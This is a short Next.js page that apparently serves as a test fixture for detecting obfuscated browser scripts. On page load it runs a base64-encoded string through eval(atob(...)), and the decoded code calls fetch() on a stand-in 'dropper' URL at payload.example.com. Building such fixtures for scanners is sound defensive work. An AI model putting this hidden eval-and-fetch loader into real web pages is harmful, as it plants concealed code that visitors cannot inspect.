import type { Metadata } from 'next'

export const metadata: Metadata = {
    title: 'Browser Obfuscated Fixture',
    robots: { index: false, follow: false },
}

const encodedPayload = 'ZmV0Y2goImh0dHBzOi8vcGF5bG9hZC5leGFtcGxlLmNvbS9kcm9wcGVyP2Nhc2U9YnJvd3Nlci1maXh0dXJlIik7ZG9jdW1lbnQud3JpdGUoIjxwPkJyb3dzZXIgZml4dHVyZSBsb2FkZWQ8L3A+Iik7'

export default function Page() {
    return (
        <main>
            <h1>Browser obfuscated fixture</h1>
            <script dangerouslySetInnerHTML={{ __html: `eval(atob("${encodedPayload}"));` }} />
        </main>
    )
}
